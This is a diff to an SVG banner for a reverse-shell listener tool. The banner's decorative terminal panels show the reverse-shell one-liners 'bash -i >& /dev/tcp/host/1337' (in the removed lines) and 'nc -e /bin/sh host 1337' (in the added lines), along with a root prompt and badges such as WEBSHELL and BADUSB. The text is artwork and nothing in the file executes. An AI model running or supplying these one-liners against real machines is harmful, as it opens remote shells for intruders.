@@ -1,75 +1,121 @@
-<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 800 300">
+<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 900 320" role="img" aria-label="reverse-shell-listener">
   <defs>
     <linearGradient id="bg" x1="0%" y1="0%" x2="100%" y2="100%">
-      <stop offset="0%" style="stop-color:#282a36"/>
-      <stop offset="100%" style="stop-color:#1a1c24"/>
+      <stop offset="0%" stop-color="#282a36"/>
+      <stop offset="50%" stop-color="#21222c"/>
+      <stop offset="100%" stop-color="#16171d"/>
     </linearGradient>
     <linearGradient id="accent" x1="0%" y1="0%" x2="100%" y2="0%">
-      <stop offset="0%" style="stop-color:#bd93f9"/>
-      <stop offset="50%" style="stop-color:#ff79c6"/>
-      <stop offset="100%" style="stop-color:#8be9fd"/>
+      <stop offset="0%" stop-color="#8be9fd"/>
+      <stop offset="50%" stop-color="#bd93f9"/>
+      <stop offset="100%" stop-color="#ff79c6"/>
     </linearGradient>
-    <filter id="glow" x="-20%" y="-20%" width="140%" height="140%">
-      <feGaussianBlur stdDeviation="3" result="blur"/>
+    <linearGradient id="green-glow" x1="0%" y1="0%" x2="100%" y2="0%">
+      <stop offset="0%" stop-color="#50fa7b"/>
+      <stop offset="100%" stop-color="#8be9fd"/>
+    </linearGradient>
+    <filter id="soft-glow" x="-30%" y="-30%" width="160%" height="160%">
+      <feGaussianBlur stdDeviation="2.5" result="blur"/>
       <feComposite in="SourceGraphic" in2="blur" operator="over"/>
     </filter>
+    <filter id="panel-shadow" x="-20%" y="-20%" width="140%" height="140%">
+      <feDropShadow dx="0" dy="8" stdDeviation="12" flood-color="#000" flood-opacity="0.4"/>
+    </filter>
+    <clipPath id="window-clip">
+      <rect width="260" height="170" rx="10"/>
+    </clipPath>
   </defs>
 
   <!-- Background -->
-  <rect width="800" height="300" fill="url(#bg)" rx="12"/>
+  <rect width="900" height="320" fill="url(#bg)" rx="16"/>
 
-  <!-- Decorative grid -->
-  <g stroke="#44475a" stroke-width="0.5" opacity="0.3">
-    <line x1="0" y1="60" x2="800" y2="60"/>
-    <line x1="0" y1="120" x2="800" y2="120"/>
-    <line x1="0" y1="180" x2="800" y2="180"/>
-    <line x1="0" y1="240" x2="800" y2="240"/>
-    <line x1="100" y1="0" x2="100" y2="300"/>
-    <line x1="300" y1="0" x2="300" y2="300"/>
-    <line x1="500" y1="0" x2="500" y2="300"/>
-    <line x1="700" y1="0" x2="700" y2="300"/>
+  <!-- Subtle hex pattern -->
+  <g opacity="0.04" fill="none" stroke="#bd93f9" stroke-width="1">
+    <path d="M50 80 L75 65 L100 80 L100 110 L75 125 L50 110 Z"/>
+    <path d="M100 80 L125 65 L150 80 L150 110 L125 125 L100 110 Z"/>
+    <path d="M75 125 L100 110 L125 125 L125 155 L100 170 L75 155 Z"/>
+    <path d="M750 200 L775 185 L800 200 L800 230 L775 245 L750 230 Z"/>
+    <path d="M800 200 L825 185 L850 200 L850 230 L825 245 L800 230 Z"/>
   </g>
 
-  <!-- Left terminal window -->
-  <g transform="translate(60, 70)">
-    <rect width="220" height="160" fill="#21222c" stroke="#bd93f9" stroke-width="2" rx="8"/>
-    <circle cx="20" cy="18" r="5" fill="#ff5555"/>
-    <circle cx="38" cy="18" r="5" fill="#f1fa8c"/>
-    <circle cx="56" cy="18" r="5" fill="#50fa7b"/>
-    <text x="20" y="55" font-family="monospace" font-size="13" fill="#50fa7b">$</text>
-    <text x="35" y="55" font-family="monospace" font-size="13" fill="#f8f8f2">bash -i &gt;&amp;</text>
-    <text x="20" y="80" font-family="monospace" font-size="13" fill="#f8f8f2">/dev/tcp/host/1337</text>
-    <text x="20" y="110" font-family="monospace" font-size="13" fill="#8be9fd">[connected]</text>
-    <text x="20" y="135" font-family="monospace" font-size="13" fill="#6272a4">_</text>
+  <!-- Left panel: target shell -->
+  <g transform="translate(70, 75)" filter="url(#panel-shadow)">
+    <rect width="260" height="170" fill="#1a1c24" stroke="#44475a" stroke-width="1" rx="10"/>
+    <rect width="260" height="28" fill="#21222c" rx="10"/>
+    <rect x="10" y="8" width="260" height="20" fill="#21222c"/>
+    <circle cx="22" cy="14" r="5" fill="#ff5555"/>
+    <circle cx="40" cy="14" r="5" fill="#f1fa8c"/>
+    <circle cx="58" cy="14" r="5" fill="#50fa7b"/>
+    <text x="220" y="18" font-family="monospace" font-size="10" fill="#6272a4">target</text>
+    <text x="16" y="55" font-family="monospace" font-size="12" fill="#50fa7b">$</text>
+    <text x="30" y="55" font-family="monospace" font-size="12" fill="#f8f8f2">nc -e /bin/sh host 1337</text>
+    <text x="16" y="80" font-family="monospace" font-size="12" fill="#8be9fd">[*] connecting...</text>
+    <text x="16" y="105" font-family="monospace" font-size="12" fill="#50fa7b">[+] session established</text>
+    <text x="16" y="135" font-family="monospace" font-size="12" fill="#bd93f9">whoami</text>
+    <text x="16" y="155" font-family="monospace" font-size="12" fill="#f8f8f2">root</text>
   </g>
 
-  <!-- Connection lines -->
-  <g stroke="url(#accent)" stroke-width="2" fill="none" opacity="0.8">
-    <path d="M280 150 L360 150" stroke-dasharray="6,4"/>
-    <path d="M440 150 L520 150" stroke-dasharray="6,4"/>
+  <!-- Center node: RSL -->
+  <g transform="translate(375, 100)" filter="url(#soft-glow)">
+    <circle cx="75" cy="60" r="55" fill="#21222c" stroke="url(#accent)" stroke-width="3"/>
+    <text x="75" y="55" text-anchor="middle" font-family="monospace" font-size="14" font-weight="bold" fill="url(#accent)">RSL</text>
+    <text x="75" y="75" text-anchor="middle" font-family="monospace" font-size="9" fill="#6272a4">LISTENER</text>
   </g>
 
-  <!-- Center node: listener -->
-  <g transform="translate(360, 110)">
-    <rect width="80" height="80" fill="#21222c" stroke="#ff79c6" stroke-width="2" rx="12" filter="url(#glow)"/>
-    <text x="40" y="35" text-anchor="middle" font-family="monospace" font-size="11" fill="#ff79c6">RSL</text>
-    <text x="40" y="55" text-anchor="middle" font-family="monospace" font-size="10" fill="#f8f8f2">Listener</text>
+  <!-- Right panel: dashboard -->
+  <g transform="translate(560, 75)" filter="url(#panel-shadow)">
+    <rect width="270" height="170" fill="#1a1c24" stroke="#44475a" stroke-width="1" rx="10"/>
+    <rect width="270" height="28" fill="#21222c" rx="10"/>
+    <rect x="10" y="8" width="270" height="20" fill="#21222c"/>
+    <circle cx="22" cy="14" r="5" fill="#ff5555"/>
+    <circle cx="40" cy="14" r="5" fill="#f1fa8c"/>
+    <circle cx="58" cy="14" r="5" fill="#50fa7b"/>
+    <text x="230" y="18" font-family="monospace" font-size="10" fill="#6272a4">dashboard</text>
+    <rect x="16" y="42" width="110" height="8" fill="#44475a" rx="2"/>
+    <rect x="16" y="58" width="80" height="6" fill="#6272a4" rx="2"/>
+    <rect x="16" y="72" width="90" height="6" fill="#6272a4" rx="2"/>
+    <circle cx="200" cy="62" r="14" fill="none" stroke="#50fa7b" stroke-width="3"/>
+    <path d="M200 52 L200 62 L208 66" fill="none" stroke="#50fa7b" stroke-width="2" stroke-linecap="round"/>
+    <rect x="16" y="100" width="238" height="50" fill="#21222c" rx="6"/>
+    <text x="28" y="120" font-family="monospace" font-size="10" fill="#f8f8f2">PTY terminal · root@target</text>
+    <text x="28" y="140" font-family="monospace" font-size="10" fill="#50fa7b">$</text>
+    <text x="42" y="140" font-family="monospace" font-size="10" fill="#f8f8f2">_</text>
   </g>
 
-  <!-- Right dashboard window -->
-  <g transform="translate(520, 70)">
-    <rect width="220" height="160" fill="#21222c" stroke="#8be9fd" stroke-width="2" rx="8"/>
-    <circle cx="20" cy="18" r="5" fill="#ff5555"/>
-    <circle cx="38" cy="18" r="5" fill="#f1fa8c"/>
-    <circle cx="56" cy="18" r="5" fill="#50fa7b"/>
-    <text x="20" y="50" font-family="monospace" font-size="13" fill="#bd93f9">Dashboard</text>
-    <rect x="20" y="65" width="180" height="12" fill="#44475a" rx="2"/>
-    <rect x="20" y="85" width="120" height="10" fill="#6272a4" rx="2"/>
-    <rect x="20" y="105" width="160" height="10" fill="#6272a4" rx="2"/>
-    <rect x="20" y="130" width="80" height="14" fill="#bd93f9" rx="3"/>
+  <!-- Connection arrows -->
+  <g stroke="url(#green-glow)" stroke-width="2.5" fill="none" stroke-linecap="round">
+    <path d="M330 160 L365 160" stroke-dasharray="4,4"/>
+    <path d="M525 160 L560 160" stroke-dasharray="4,4"/>
+  </g>
+  <g fill="url(#green-glow)">
+    <polygon points="365,156 375,160 365,164"/>
+    <polygon points="560,156 570,160 560,164"/>
+  </g>
+
+  <!-- Protocol badges -->
+  <g font-family="monospace" font-size="10" font-weight="bold">
+    <rect x="120" y="260" width="50" height="20" fill="#21222c" stroke="#ff79c6" stroke-width="1" rx="4"/>
+    <text x="145" y="274" text-anchor="middle" fill="#ff79c6">TCP</text>
+
+    <rect x="185" y="260" width="50" height="20" fill="#21222c" stroke="#bd93f9" stroke-width="1" rx="4"/>
+    <text x="210" y="274" text-anchor="middle" fill="#bd93f9">TLS</text>
+
+    <rect x="250" y="260" width="70" height="20" fill="#21222c" stroke="#8be9fd" stroke-width="1" rx="4"/>
+    <text x="285" y="274" text-anchor="middle" fill="#8be9fd">WEBSHELL</text>
+
+    <rect x="335" y="260" width="55" height="20" fill="#21222c" stroke="#50fa7b" stroke-width="1" rx="4"/>
+    <text x="362" y="274" text-anchor="middle" fill="#50fa7b">MUX</text>
+
+    <rect x="405" y="260" width="55" height="20" fill="#21222c" stroke="#f1fa8c" stroke-width="1" rx="4"/>
+    <text x="432" y="274" text-anchor="middle" fill="#f1fa8c">PROXY</text>
+
+    <rect x="475" y="260" width="70" height="20" fill="#21222c" stroke="#ff79c6" stroke-width="1" rx="4"/>
+    <text x="510" y="274" text-anchor="middle" fill="#ff79c6">BADUSB</text>
+
+    <rect x="560" y="260" width="80" height="20" fill="#21222c" stroke="#8be9fd" stroke-width="1" rx="4"/>
+    <text x="600" y="274" text-anchor="middle" fill="#8be9fd">FILE MGR</text>
   </g>
 
   <!-- Title -->
-  <text x="400" y="260" text-anchor="middle" font-family="monospace" font-size="28" font-weight="bold" fill="url(#accent)" filter="url(#glow)">reverse-shell-listener</text>
-  <text x="400" y="285" text-anchor="middle" font-family="monospace" font-size="12" fill="#6272a4">multi-transport reverse-shell catcher with a browser dashboard</text>
+  <text x="450" y="42" text-anchor="middle" font-family="monospace" font-size="32" font-weight="bold" fill="url(#accent)" filter="url(#soft-glow)">reverse-shell-listener</text>
 </svg>
